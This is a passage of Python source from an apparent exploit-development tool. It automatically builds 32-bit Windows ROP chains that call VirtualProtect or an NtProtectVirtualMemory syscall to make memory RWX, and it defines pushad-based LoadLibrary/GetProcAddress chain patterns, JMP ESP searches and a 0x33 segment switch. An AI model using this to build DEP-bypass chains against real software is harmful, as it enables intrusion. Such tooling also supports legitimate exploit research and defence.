	distFinalESP=0x34  # distance to esp at end - dynamically generated. This is just a starting point - emulation will correct to the actual value.
	numP=6
	espTargetParm1=0
	destAfter=True
	IncDec="dec"
	syscallSSN=0x4a

	availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
	dp ("excludeRegs", excludeRegs)
	dp("availableRegs", availableRegs)
	primaryOp2=""

	for reg in excludeRegs:
		availableRegs.remove(reg)
	length1=True
	espDesiredMovement=0
	package=[]
	for reg in availableRegs:
		foundMovderef=False
		regsNotUsed= copy.deepcopy(availableRegs)
		regsNotUsed.remove(reg)
		for op2 in regsNotUsed:	
			print ("   Checking possibilities", cya,reg,res, ":", yel,op2,res)
			regsNotUsed2= copy.deepcopy(regsNotUsed)
			regsNotUsed2.remove(op2)
			dp ("op2 regsNotUsed", op2)
			excludeRegs2,regsNotUsed3= regsAvailtoExclude(regsNotUsed2,excludeRegs)
			foundM1, m1 = findMovDeref(reg,op2,bad,length1, excludeRegs2)
			if not foundM1:
				continue
			foundL1, p1, chP = loadReg(op2,bad,True,excludeRegs2,0x40,"NewProtection")
			if not foundL1:
				continue
			foundInc, i1 = findGeneric("dec",reg,bad,length1, regsNotUsed3,espDesiredMovement)
			if not foundInc:
				continue
			foundStart, pkStart=findMovDerefGetStack(reg,bad,length1, excludeRegs2,regsNotUsed3,espDesiredMovement,distEsp)

			if not foundStart:
				continue
			excludeRegs3= copy.deepcopy(excludeRegs2)
			try:
				excludeRegs3.append(reg)
			except:
				pass
			
			foundT=False
			foundT2=False
			for op3 in regsNotUsed3:	
				regsNotUsed4= copy.deepcopy(regsNotUsed3)
				regsNotUsed4.remove(op3)
				try:
					regsNotUsed4.remove(reg)
				except:
					pass
				foundT, gT1 = findUniTransfer("37",op3,reg, bad,length1,excludeRegs3,espDesiredMovement, "Save pointer to memory, " + op3,False,True)
				foundT2, gTbase = findUniTransfer("38",op2,reg, bad,length1,excludeRegs3,espDesiredMovement, "Get BaseAddress value for pointer",False,True)
				if foundT and foundT2:
					altRegforESP=op3
					break
			if not foundT or not foundT2:
				continue
			try:
				excludeRegs3.append(op3)
			except:
				pass

			helperSuccessSV, pkNBforPtr=helperMovDeref(reg,op2,bad,length1, regsNotUsed4,espDesiredMovement, NumberBytesProtect, m1,i1,"Set up value for Number of Bytes for ptr, " + hex(NumberBytesProtect))
			
			foundT, gT3 = findUniTransfer("39",op2,op3, bad,length1,excludeRegs3,espDesiredMovement, "Get ptr to OldAccessProtection",False,True)
			if not foundT:
				continue

			helperSuccessP5, pkP5=helperMovDerefNoLoad(reg,op2,bad,length1, regsNotUsed4,espDesiredMovement, op2, "Write ptr to OldAccessProtection to memory")
			helperSuccessP4, pkP4=helperMovDeref(reg,op2,bad,length1, regsNotUsed4,espDesiredMovement, NewAccessProt, m1,i1,"NewAccessProteciton, " + hex(NewAccessProt))
			if not helperSuccessP5 and helperSuccessP4:
				continue

			foundT2, gT4 = findUniTransfer("40",op2,altRegforESP, bad,length1,excludeRegs3,espDesiredMovement, "Get point of reference to values",False,True)
			if not foundT2:
				continue

			foundInc, inc1 = findGeneric("inc",op2,bad,length1, regsNotUsed4,espDesiredMovement)
			if foundInc:
				cI=chainObj(i1, "Increment " + op2, [])
			else:
				continue

			helperSuccessP3, pkP3=helperMovDerefNoLoad(reg,op2,bad,length1, regsNotUsed4,espDesiredMovement, op2, "NumberOfBytesToProtect pointer")
			if not helperSuccessP3:
				continue

			pkP3=pkBuild([gT4,inc1,inc1,inc1,inc1,pkP3])#,pkDW,pkLP,pkRA,pkVP,pkEnd]) #pkFn,pkDW
			helperSuccessP2, pkP2=helperMovDerefNoLoad(reg,op2,bad,length1, regsNotUsed4,espDesiredMovement, op2, "BaseAddress pointer")
			if not helperSuccessP2:
				continue

			pkP2=pkBuild([inc1,inc1,inc1,inc1,pkP2])#,pkDW,pkLP,pkRA,pkVP,pkEnd]) #pkFn,pkDW
			
			helperSuccessP1, pkP1=helperMovDeref(reg,op2,bad,length1, regsNotUsed4,espDesiredMovement, processHandle, m1,i1,"Set ProcessHandle to -1, itself, " + hex(processHandle))
			fRet, pR,rDict=findRet(bad)
			if not helperSuccessP1:
				continue
			
			helperSuccessRA1, pkRA1=helperMovDeref(reg,op2,bad,length1, regsNotUsed4,espDesiredMovement,img(pR), m1,i1,"Return address #2 - rop nop ", "Write ReturnAddress #1 to mem")
			if not helperSuccessRA1:
				continue
			
			helperSuccessRA2, pkRA2=helperMovDeref(reg,op2,bad,length1, regsNotUsed4,espDesiredMovement,img(pR),m1,i1,"Return address #2 - rop nop ","Write ReturnAddress #2 to mem")
			if not helperSuccessRA2:
				continue

			cM=chainObj(m1, "Write BaseAddress value to mem", [])
			cI=chainObj(i1, "Decrement " + reg, [])
			pkBA=([cM, cI,cI,cI,cI])
			# print("pkStart", pkStart)
			# print("gTbase", gTbase)
			# print("pkBA", pkBA)
			# print("pkNBforPtr", pkNBforPtr)
			# print("gT1", gT1)
			# print("gT3", gT3)
			# print("pkP5", pkP5)
			# print("pkP4", pkP4)
			# print("pkP3", pkP3)
			# print("pkP2", pkP2)
			# print("pkP1", pkP1)
			# print("pkRA1", pkRA1)
			# print("pkRA2", pkRA2)
			curPk=pkBuild([pkStart,gTbase,pkBA,pkNBforPtr,gT1, gT3,pkP5,pkP4,pkP3,pkP2,pkP1,pkRA1,pkRA2])#,pkDW,pkLP,pkRA,pkVP,pkEnd]) #pkFn,pkDW
		# distParam, apiReached=getDistanceParamReg(pe,n,pk,distEsp,IncDec,numP,1, reg, destAfter)  # pe,n,gadgets, IncDec,numP,targetP,targetR, destAfter

			foundSys, pkSysSetup=getSyscallSetup(reg,op2,bad,length1, regsNotUsed,espDesiredMovement,curPk,syscallSSN,distEsp,IncDec,numP,destAfter,distFinalESP,SyscallName,excludeRegs2,m1)
			if not foundSys:
				print (red,"\n\n Almost made it: Only lacking gadget to leak FS",res,)
				continue

			if  foundSys:
				pk=pkBuild([pkStart,gTbase,pkBA,pkNBforPtr,gT1, gT3,pkP5,pkP4,pkP3,pkP2,pkP1,pkRA1,pkRA2,pkSysSetup])
				dp ("\nsyscall chain\n")
				showChain(pk)
				cOut,out=genOutput(pk)	
				print (cOut)
				fgc.addNtProtect(fChainObj(pk,out,cOut))
				printGadgetChain(out, "w_syscall_NtProtectVirtualMemory")

				return
	print ("No chains found.")

def get_VirtualProtectPTR():		
		vp=0x77666999
		comment=""
		try:
			vp=dllDict["kernel32.dll"]["VirtualProtect"]
			foundLL=True
		except:
			foundLL=False
			comment="Ptr to VirtualProtect not found. 0x20000 used as placeholder."
		if foundLL:
			dp ("returning ptr to VirtualProtect")	
			comment="Ptr to VirtualProtect"
			return True, vp,comment
		else:
			True,vp,"Simulated value-VirtualProtect ptr not found!"
		return False,vp,"VirtualProtect not Found"	

def buildMovDeref(bad, myArgs ,numArgs):
	clearGlobals()
	outFile.write("The below is for API VirtualProtect\n")
	excludeRegs=[]
	global PWinApi
	plpflOldProtect=myArgs[5]
	plfNewProtect=myArgs[4]
	pdwSize=myArgs[3]
	plpAddress=myArgs[2]
	pReturnAddress=myArgs[1]
	pVP=myArgs[0]
	dp ("myArgs2", myArgs)
	sysTarget=0x666
	distEsp=0x500  # distance to start of parameters  - user input
	distParam=0x55 # distance to lp parameter    - dynamically generated  possibly via emulation?  how has the stack changed since that point in time--run all gadgets previous to this in emulation to determine the offset needed.
	distFinalESP=0x34  # distance to esp at end - dynamically generated. This is just a starting point - emulation will correct to the actual value.
	foundVP, pVP, commentVP=get_VirtualProtectPTR()
	
	dp ("pVP",pVP)
	PWinApi=pVP
	numP=4
	espTargetParm1=0
	destAfter=True
	IncDec="dec"

	availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
	primaryOp2=""
	pattern=2

	patterns = {2: False, 3: False}
	for reg in excludeRegs:
		availableRegs.remove(reg)
	length1=True
	espDesiredMovement=0
	package=[]
	# print ("availableRegs",availableRegs)
	t=0
	for reg in availableRegs:
		t+=1
		# print (reg,t)
		foundMovderef=False
		regsNotUsed= copy.deepcopy(availableRegs)
		regsNotUsed.remove(reg)
		for op2 in regsNotUsed:	
			dp ("op2 regsNotUsed", op2)
			excludeRegs2,regsNotUsed2= regsAvailtoExclude(regsNotUsed,excludeRegs)
			excludeRegs2.append(op2)

			foundM1, m1 = findMovDeref(reg,op2,bad,length1, excludeRegs2)
			if not foundM1:
				# print (red, reg, op2, res,"mov deref not found, continue",res)
				continue
			# if foundM1:
			# 	primaryOp2=op2
			foundL1, p1, chP = loadReg(op2,bad,True,excludeRegs2,plpflOldProtect,"lpflOldprotect")
			if not foundL1:
				# print ("not found, continue l1")
				continue
			foundInc, i1 = findGeneric("dec",reg,bad,length1, regsNotUsed2,espDesiredMovement)
			if not foundInc:
				# print ("not found, continue INc")
				continue
			if foundM1 and foundL1 and foundInc:
				helperSuccessDw, pkDW=helperMovDeref(reg,op2,bad,length1, regsNotUsed2,espDesiredMovement,pdwSize, m1,i1,"Dwsize = " + hex(pdwSize))
				helperSuccessFn, pkFn=helperMovDeref(reg,op2,bad,length1, regsNotUsed2,espDesiredMovement,plfNewProtect, m1,i1,"flNewProtect = " + hex(plfNewProtect))
				cM=chainObj(m1, "Write param to mem", [])
				cI=chainObj(i1, "Decrement " + reg, [])
				pkFo=pkBuild([chP,cM, cI,cI,cI,cI])
				# print (helperSuccessDw,helperSuccessFn)
				if helperSuccessDw and helperSuccessFn:
					foundMovderef=True
					break
		if not foundMovderef:
			dp ("continue 1 foundMovderef")
			# print ("continue 1 foundMovderef")

			continue

		foundStart, pkStart=findMovDerefGetStack(reg,bad,length1, excludeRegs2,regsNotUsed2,espDesiredMovement,distEsp)
		pkFlOld=pkBuild([chP,cM, cI,cI,cI,cI])
		if not foundStart:
			# print ("not foundStart continue")
			continue

		# print ("values", pkStart,pkFlOld,pkFn,pkDW)
		pk=pkBuild([pkStart,pkFlOld,pkFn,pkDW])#,pkDW,pkLP,pkRA,pkVP,pkEnd]) #pkFn,pkDW
		# distParam, apiReached=getDistanceParamReg(pe,n,pk,distEsp,IncDec,numP,1, reg, destAfter)  # pe,n,gadgets, IncDec,numP,targetP,targetR, destAfter

		distParam, apiReached=getDistanceParamReg(pe,n,pk,distEsp,IncDec,numP,"shellcode", reg, destAfter,PWinApi,sysTarget)  # pe,n,gadgets, IncDec,numP,targetP,targetR, destAfter
		# distParam=distShell

		foundLR, pkLP= buildLPorRA1(reg,fg.rop[m1].op2,bad,length1, excludeRegs2,regsNotUsed2,espDesiredMovement,distParam, cI,cM,"LpAddress")
		if foundLR:
			pkRA= buildLPorRA2(reg,fg.rop[m1].op2,bad,length1, excludeRegs2,regsNotUsed2,espDesiredMovement, cI,m1,"Return Address")
		foundVP,pkVP= buildLPWinAPI(fg.rop[m1].op2,reg,bad,length1, excludeRegs2,regsNotUsed2,espDesiredMovement,pVP, cI,cM,commentVP)
		if foundVP:
			dp ("have pointer to VirtualProtect")
			# print ("have pointer to VirtualProtect")
		if not foundLR:
			dp ("not foundLR continue")
			# print ("not foundLR continue")
			continue
		if not foundVP:
			dp ("not foundvp continue")
			# print ("not foundvp continue")
			continue
		#pattern 2
		# curPk=pkBuild([pkStart,pkFlOld,pkFn,pkLP, pkRA,pkVP])
		curPk=pkBuild([pkStart,pkFlOld,pkFn,pkDW,pkLP,pkRA,pkVP]) #pkFn,pkDW
		dp ("before findChangeESP", "foundStart", foundStart, "foundVP", foundVP, "foundMovderef", foundMovderef)
		if foundStart and foundVP and foundMovderef:
			dp ("after findChangeESP", "foundStart", foundStart, "foundVP", foundVP, "foundMovderef", foundMovderef)
			compensate=0
			foundESPFinal, pkEnd =findChangeESP(reg,bad,length1, excludeRegs2,regsNotUsed2,espDesiredMovement,distFinalESP,curPk,distEsp,destAfter,IncDec,numP,compensate,"winApi",sysTarget,PWinApi)
			if not foundESPFinal:
				# print ("special continue", reg, t)
				continue
			else:
				pkEnd =pkBuild([pkVP, pkEnd]) #pkFn,pkDW
			# foundESPFinal=False  #just artificially false for testing verification

			if not foundESPFinal:
				curPk=pkBuild([pkStart,pkFlOld,pkFn,pkDW,pkLP,pkRA]) #pkFn,pkDW
				#pattern 3
				addEspAttempts.clear()
				compensate=-4
				foundMJ, pkArgJmp =buildJmpToAPI(op2,bad,length1, excludeRegs2,regsNotUsed2,espDesiredMovement, pVP,  cM,distFinalESP,curPk,distEsp,destAfter,IncDec,numP,compensate,sysTarget)
				pkEnd=pkBuild([pkArgJmp]) #pkFn,pkD
				foundESPFinal=True
		if foundMovderef and foundESPFinal and foundStart and foundVP:
			cM=chainObj(m1, "Write param to mem", [])
			cI=chainObj(i1, "Decrement " + reg, [])
			
			pk2=pkBuild([pkStart,pkFlOld,pkFn,pkDW,pkLP,pkRA,pkEnd]) #pkFn,pkDW
			dp ("\n\nreal final chain")
			distParam, apiReached=getDistanceParamReg(pe,n,pk2,distEsp,IncDec,numP,"winApi", "esp", destAfter,PWinApi,sysTarget)  # pe,n,gadgets, IncDec,numP,targetP,targetR, destAfter
			showChain(pk2)
			cOut,out=genOutput(pk2)
			print(cOut)
			fgc.addmdVirtualProtect(fChainObj(pk2,out,cOut))
			printGadgetChain(out, "mov_deref_VirtualProtect")
			return
		else:
			print (" No chains found.")
			print ( "  Insufficient gadgets at this time for mov dereference VirtualProtect")
			return

class pushadPattern:
	def __init__(self, id,r1, r1Val,r2,r2Val,r3,r3Val,r4,r4Val,r5,r5Val,r6,r6Val,r7,r7Val,r8,r8Val):
		# self.eax=eax
		# self.ebx=ebx
		# self.ecx=ecx
		# self.edx=edx
		# self.edi=edi
		# self.esi=esi
		# self.ebp=
		# self.esp
		self.id
		self.r1=r1
		self.r2=r2
		self.r3=r3
		self.r4=r4
		self.r5=r5
		self.r6=r6
		self.r7=r7
		self.r8=r8
		self.r1ExcludeRegs=[]
		self.r2ExcludeRegs=[]
		self.r3ExcludeRegs=[]
		self.r4ExcludeRegs=[]
		self.r5ExcludeRegs=[]
		self.r6ExcludeRegs=[]
		self.r7ExcludeRegs=[]
		self.r8ExcludeRegs=[]

		self.r1Val=r1Val
		self.r2Val=r2Val
		self.r3Val=r3Val
		self.r4Val=r4Val
		self.r5Val=r5Val
		self.r6Val=r6Val
		self.r7Val=r7Val
		self.r8Val=r8Val
	def setExclude(reg,excludeList):
		if reg=="eax":
			self.r1ExcludeRegs=excludeList


class getParamVals:
	def __init__(self):
		self.info=1
	def get(self, name: str,excludeRegs,r,r2,bad,pk):#, testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL,c2=False):
		dp ("get", name)
		# print ("get",name)
		if 1==1:
			do = f"get_{name}"

			if hasattr(self, do) and callable(func := getattr(self, do)):
				found,val,comment=func(name,excludeRegs,r,r2,bad,pk)
				return found,val,comment
		return False,0x999999,comment
	# def get2(self, name: str,excludeRegs,r,r2,bad,pk):#, testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL,c2=False):
	# 	# dp ("get2", name)
	# 	if 1==1:
	# 		do = f"get_{name}2"

	# 		if hasattr(self, do) and callable(func := getattr(self, do)):
	# 			found,val,comment=func(name,excludeRegs,r,r2,bad,pk)
	# 			return found,val,comment
	# 	return False,0x999999,comment

	def get_pop(self,name,excludeRegs,r,r2,bad,pk):
		dp ("get pop excludeRegs", excludeRegs )
		length1=True
		foundP1=False
		availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
		for reg in excludeRegs:
			availableRegs.remove(reg)
		for reg in availableRegs:
			foundP1, p1,pDict=findPop(reg,bad,length1,excludeRegs)
			if foundP1:
				break
		comment=""
		if foundP1:
			return True, p1,comment
		return False,0, "Pop not found"
	
	def get_popLoad(self,name,excludeRegs,r,r2,bad,pk):
		# dp ("get pop load")
		length1=True
		foundP1=False
		comment=" "
		foundP1, p1,pDict=findPop(r,bad,length1,excludeRegs)
		if foundP1:
			return True, p1,comment
		return False,0, "Pop not found"

	def get_loadLibraryPtr(self,name,excludeRegs,r,r2,bad,pk):
		dp ("get loadLibraryPtr")
		l=0x30000
		comment=""
		try:
			l=dllDict["kernel32.dll"]["LoadLibraryA"]
		except:
			dp ("Ptr to LoadLibrary not found.")
			comment="Ptr to LoadLibrary not found. 0x30000 used as placeholder."

		foundLL=True
		if foundLL:
			return True, l,comment
		else:
			True,0x30000,"Simulated value-LoadLibrary ptr not found!"
		return False,0,"loadLibraryPtr not Found"
	def get_GetProcAddressPTR(self,name,excludeRegs,r,r2,bad,pk):
		dp ("get GetProcAddressPTR")
		l=0x20000
		comment=""
		try:
			l=dllDict["kernel32.dll"]["GetProcAddress"]
		except:
			dp ("Ptr to GetProcAddress not found.")
			comment="Ptr to GetProcAddress not found. 0x20000 used as placeholder."

		foundLL=True
		if foundLL:
			dp ("returning ptr to GetProcAddress")
			return True, l,comment
		else:
			dp ("returning simulated ptr to GetProcAddress")

			True,0x20000,"Simulated value-GetProcAddress ptr not found!"
		return False,0,"GetProcAddressPtr not Found"		
	def get_skip(self,name,excludeRegs,r,r2,bad,pk):
		dp ("get skip")
		skip="skip"
		comment=""
		return True, skip,comment
	def get_lpProcName(self,name,excludeRegs,r,r2,bad,pk):
		fRet, rn,rDict=findRet(bad)
		comment=""
		if fRet:
			return True, rn,comment
		return True, skip,comment		
	def get_SystemPTR(self,name,excludeRegs,r,r2,bad,pk):
		fRet, rn,rDict=findRet(bad)
		comment=""
		if fRet:
			return True, rn,comment
		return True, skip,comment		
	def get_Command(self,name,excludeRegs,r,r2,bad,pk):
		fRet, rn,rDict=findRet(bad)
		comment=""
		if fRet:
			return True, rn,comment
		return True, skip,comment				
	def get_hModule(self,name,excludeRegs,r,r2,bad,pk):
		fRet, rn,rDict=findRet(bad)
		comment=""
		if fRet:
			return True, rn,comment
		return True, skip,comment
	def get_retf(self,name,excludeRegs,r,r2,bad,pk):
		fRet, rn,rDict=findRetf(bad)
		comment=""
		if fRet:
			return True, rn,comment
		return False,0,"Retf not found"
	
	def get_destination0x33(self,name,excludeRegs,r,r2,bad,pk):
		fRet, rn,rDict=findRet(bad)
		comment=" - will become x64 here"
		if fRet:
			return True, rn,comment
		return False,0,"Destination for HG not found"
	
	def get_cs0x33(self,name,excludeRegs,r,r2,bad,pk):
		# length1=True
		# foundL1, p1, chP1 = loadReg(r,bad,length1,excludeRegs,0x33)
		comment=""

		# if foundL1:
		return True, 0x33,comment
		return False,0,"0x33 selector not found"
	def get_ropNop(self,name,excludeRegs,r,r2,bad,pk):
		fRet, rn,rDict=findRet(bad)
		comment=""
		if fRet:
			return True, rn,comment
		return False,0,"ROP NOP not found"
	def get_JmpDword(self,name,excludeRegs,r,r2,bad,pk):
		foundJ, j1=findJmpDword(r2,bad)
		comment=""
		if foundJ:
			return True, j1,comment
		# print ("jmpDword not found")
		return False,0xffffadd,"JMP DWORD NOT FOUND"

	def get_JmpESP(self,name,excludeRegs,r,r2,bad,pk):
		foundJ, j1 = findGenericC2AgnosticJmpCall("jmp","esp",bad,True, [],0)
		comment=""
		if foundJ:	
			try:
				tryThis=tryThisFunc(j1)

				# tryThis= " -> " + disOffset(j1)
				dp (tryThis)
			except Exception as e:
				tryThis=hex(j1)
			comment= hx(img(j1)) +  tryThis
		if foundJ:
			# j1=img(j1)
			return True, j1,comment
		# print ("jmpDword not found")
		return False,0xffffadd,"JMP ESP NOT FOUND"

	def get_nop(self,name,excludeRegs,r,r2,bad,pk):
		comment="Build some NOPs"
		return True, 0x90909090,comment
		
	def get_VAPtr(self,name,excludeRegs,r,r2,bad,pk):
		dp ("get VPPtr")
		l=0x30000
		comment="VirtualAlloc pointer"
		try:
			l=dllDict["kernel32.dll"]["VirtualAlloc"]
		except:
			try:
				l=dllDict["kernelbase.dll"]["VirtualAlloc"]
			except:
				dp ("Ptr to VirtualAlloc not found.")
				comment="Ptr to VirtualAlloc not found. 0x30000 used as placeholder."

		foundLL=True
		if foundLL:
			return True, l,comment
		else:
			True,0x30304,"Simulated value-VirtualAlloc ptr not found!"
		return False,0,"VirtualAlloc Ptr not Found"


	def get_VAPtr2(self,name,excludeRegs,r,r2,bad,pk):
		dp ("get get_VAPtr2")
		bVal,p, com=self.get_VAPtr(name,excludeRegs,r,r2,bad,pk)
		return bVal,p,com

	def get_VPPtr(self,name,excludeRegs,r,r2,bad,pk):
		dp ("get VPPtr")
		l=0x30000
		comment=""
		try:
			l=dllDict["kernel32.dll"]["VirtualProtect"]
		except:
			try:
				l=dllDict["kernelbase.dll"]["VirtualProtect"]
			except:
				dp ("Ptr to VirtualProtect not found.")
				comment="Ptr to VirtualProtect not found. 0x30000 used as placeholder."

		foundLL=True
		if foundLL:
			return True, l,comment
		else:
			True,0x30306,"Simulated value-VirtualProtect ptr not found!"
		return False,0,"VirtualProtect Ptr not Found"

	def get_VPPtr2(self,name,excludeRegs,r,r2,bad,pk):
		dp ("get VPPtr2")
		bVal,p, com=self.get_VPPtr(name,excludeRegs,r,r2,bad,pk)
		return bVal,p,com

	def get_dwSize(self,name,excludeRegs,r,r2,bad,pk):
		comment=""
		return True, 0x409,comment
	
	def get_dwSize2(self,name,excludeRegs,r,r2,bad,pk):
		comment=" - dwSize"
		return True, 0x01,comment


	def get_flAllocationType(self,name,excludeRegs,r,r2,bad,pk):
		comment=" flAllocationType (MEM_COMMIT)"
		return True, 0x1000,comment

	def get_flNewProtect(self,name,excludeRegs,r,r2,bad,pk):
		comment=" - RWX"
		return True, 0x40,comment

	def get_flOldProtect(self,name,excludeRegs,reg,r2,bad,pk):
		# print ("get_flOldProtect", reg, r2, excludeRegs)
		comment="Can be any writable memory"
		availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
		espDesiredMovement=0
		for reg1 in excludeRegs:
			availableRegs.remove(reg1)
		length1=True

		comment="Can be any writable memory"
		foundStart, chSP=findStackPivot(reg,bad,length1, excludeRegs,availableRegs,comment)
		if foundStart:
			# showChain(chSP,True)
			return True, chSP,comment

		for r in availableRegs:
			foundStart, chSP2=findStackPivot(r,bad,length1, excludeRegs,availableRegs,comment)
			if foundStart:
				excludeRegs2= copy.deepcopy(excludeRegs)
				excludeRegs2.append(r)
				foundT, gT = findUniTransfer("41",reg,r, bad,length1,excludeRegs2,espDesiredMovement, "Transfer " +r +" to " + reg)
				if foundT:
					pk=pkBuild([chSP2, gT])
					# showChain(pk,True)
					return True, pk,comment

		foundP1, p1, chP = loadReg(reg1,bad,length1,excludeRegs,0xbaddcad2,comment)
		if foundP1:
			return True, chP,comment
		else:
			return False, 0,0

	def get_jmp(self,name,excludeRegs,r,r2,bad,pk):
		foundJ, j1=findJmp(r2,bad)
		comment=""
		if foundJ:
			return True, j1,comment
		return False,0,"JMP NOT FOUND"
	def get_returnAddress(self,name,excludeRegs,r,r2,bad,pk):
		dp ("get_returnAddress")

		dp ("bad",bad)
		fRet, rn,rDict=findRet(bad)
		comment=""
		dp ("fRet",fRet)
		if fRet:
			dp ("get_returnAddress = true")
			return True, rn,comment
		dp ("return false")
		return False,0,"ReturnAddress not found"
	def get_ret_c2(self,name,excludeRegs,r,r2,bad,pk):
		# dp ("get_ret_c2", r, r2)
		val=r2
		foundRC2, rC2p,cRc2=findRetC2(bad,val)
		comment=""
		# dp ("final retC2")
		# dp(rC2p, hex(rC2p))
		if foundRC2:
			return True, rC2p,comment
		# dp ("returning false")
		return False,0,"Ret C2 not found"
	def get_addESP(self,name,excludeRegs,r,r2,bad,pk):
		dp ("get_addESP",name)
		foundAdd,pAE,chAE= findAddValtoESP(r2,bad, excludeRegs)

		comment=""
		if foundAdd:
			return True, pAE,comment
		return False,0,"Add ESP not found"		
	def get_targetDllString(self,name,excludeRegs,r,r2,bad,pk):
		#not sure - use globals for target string, etc, or object?
		foundT1=True
		comment=""
		if foundT1:
			return True, 0xbaddbadd,comment
		return False,0,""
	def get_targetDllString2(self,name,excludeRegs,r,r2,bad,pk):
		#not sure - use globals for target string, etc, or object?
		dp ("get_targetDllString2 called")
		foundT1=True
		comment=""
		if foundT1:
			return True, 0xbaddbadd,comment
		return False,0,""

pv=getParamVals()

hasImg={'loadLibraryPtr':False,'pop':True,'skip':False,'ropNop':True,'JmpDword':True,'returnAddress':True,'targetDllString':False,'ret_c2':True,'addESP':True, 'GetProcAddressPTR':True,'hModule':False,'lpProcName':False, 'jmp':True, "popLoad":True, 'destination0x33':True, "retf": True, "cs0x33":False}

hasRedo={'loadLibraryPtr':False,'pop':False,'skip':False,'ropNop':False,'JmpDword':False,'returnAddress':False,'targetDllString':True}

pat = {  'LoLi1':{ 
		'1': {'r': 'edi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'2': {'r': 'eax', 'val': 'targetDllString', 'excluded':[],"r2":"",'com':'Target DLL string'},
		'3': {'r': 'esi', 'val': 'ret_c2', 'excluded':[], "r2":8,'com':''},
		'4': {'r': 'ebp', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'6': {'r': 'ebx', 'val': 'loadLibraryPtr', 'excluded':[], "r2":"",'com':'Ptr to LoadLibrary'},
		'7': {'r': 'edx', 'val': 'JmpDword', 'excluded':[], "r2":"ebx",'com':''},
		'8': {'r': 'ecx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':''}
        },

        'LoLi2':{ 
		'1': {'r': 'edi', 'val': 'pop', 'excluded':["esi"], "r2":"",'com':''},
		'2': {'r': 'ecx', 'val': 'targetDllString', 'excluded':[], "r2":"",'com':'Target DLL string'},
		'3': {'r': 'esi', 'val': 'loadLibraryPtr', 'excluded':[], "r2":"",'com':'Ptr to LoadLibrary'},
		'4': {'r': 'ebp', 'val': 'pop', 'excluded':["esi"], "r2":"",'com':''},
		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'6': {'r': 'ebx', 'val': 'JmpDword', 'excluded':[], "r2":"esi",'com':''},
		'7': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
		'8': {'r': 'eax', 'val': 'ropNop', 'excluded':[],"r2":"",'com':'Rop nop'} 
        },

		'LoLi3':{ 
		'1': {'r': 'esi', 'val': 'loadLibraryPtr', 'excluded':[], 'r2':'','com':'Ptr to LoadLibrary'},
		'2': {'r': 'eax', 'val': 'targetDllString', 'excluded':[], 'r2':'','com':'Target DLL string'},
		'3': {'r': 'ebp', 'val': 'pop', 'excluded':['esi'], 'r2':'','com':''},
		'4': {'r': 'esp', 'val': 'skip', 'excluded':[], 'r2':'','com':''},
		'5': {'r': 'ebx', 'val': 'ropNop', 'excluded':[], 'r2':'','com':'Rop nop'},
		'6': {'r': 'edx', 'val': 'JmpDword', 'excluded':[], 'r2':'esi','com':''},
		'7': {'r': 'ecx', 'val': 'returnAddress', 'excluded':[], 'r2':'','com':'Return address'},
		'8': {'r': 'edi', 'val': 'pop', 'excluded':['esi'], 'r2':'','com':''}
        },

        'LoLi4':{ 
		'1': {'r': 'edi', 'val': 'ret_c2', 'excluded':[], "r2":8,'com':''},
		'2': {'r': 'eax', 'val': 'targetDllString', 'excluded':[],"r2":"",'com':'Target DLL string'}, 
		'3': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'4': {'r': 'ebp', 'val': 'loadLibraryPtr', 'excluded':[], "r2":"",'com':'Ptr to LoadLibrary'},
		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'6': {'r': 'ebx', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'7': {'r': 'edx', 'val': 'JmpDword', 'excluded':[], "r2":"ebp",'com':''},
		'8': {'r': 'ecx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
        },

        'LoLi5':{ 
		'1': {'r': 'edi', 'val': 'ret_c2', 'excluded':[], "r2":8,'com':''},
		'2': {'r': 'ecx', 'val': 'targetDllString', 'excluded':[], "r2":"",'com':'Target DLL string'},
		'3': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'4': {'r': 'ebp', 'val': 'loadLibraryPtr', 'excluded':[], "r2":"",'com':'Ptr to LoadLibrary'},
		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'6': {'r': 'ebx', 'val': 'JmpDword', 'excluded':[], "r2":"ebp",'com':''},
		'7': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
		'8': {'r': 'eax', 'val': 'ropNop', 'excluded':[],"r2":"",'com':'Rop nop'} 
        },

        'LoLi6':{ 
		'1': {'r': 'edi', 'val': 'addESP', 'excluded':[], "r2":'0xc','com':''},
		'2': {'r': 'ecx', 'val': 'targetDllString', 'excluded':[], "r2":"",'com':'Target DLL string'},
		'3': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'4': {'r': 'ebp', 'val': 'loadLibraryPtr', 'excluded':[], "r2":"",'com':'Ptr to LoadLibrary'},
		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'6': {'r': 'ebx', 'val': 'JmpDword', 'excluded':[], "r2":"ebp",'com':''},
		'7': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
		'8': {'r': 'eax', 'val': 'ropNop', 'excluded':[],"r2":"",'com':'Rop nop'} 
        },

        'LoLi7':{ 
		'1': {'r': 'edi', 'val': 'addESP', 'excluded':[], "r2":'0xc','com':''},
		'2': {'r': 'ecx', 'val': 'targetDllString', 'excluded':[], "r2":"",'com':'Target DLL string'},
		'3': {'r': 'esi', 'val': 'loadLibraryPtr', 'excluded':[], "r2":"",'com':'Ptr to LoadLibrary'},
